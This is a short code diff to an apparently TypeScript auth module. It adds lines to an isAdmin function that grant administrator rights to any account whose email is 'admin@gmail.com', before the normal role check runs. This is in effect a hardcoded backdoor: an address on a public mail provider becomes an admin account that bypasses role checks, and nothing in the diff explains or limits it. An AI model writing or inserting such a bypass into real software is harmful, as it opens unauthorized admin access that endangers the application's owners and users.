@@ -33,6 +33,9 @@ export async function createUserClient(req: Request): Promise<{
 }
 
 export function isAdmin(user: User): boolean {
+  const email = (user.email ?? '').trim().toLowerCase();
+  if (email === 'admin@gmail.com') return true;
+
   const role =
     typeof user.user_metadata?.role === 'string'
       ? user.user_metadata.role.trim().toLowerCase()
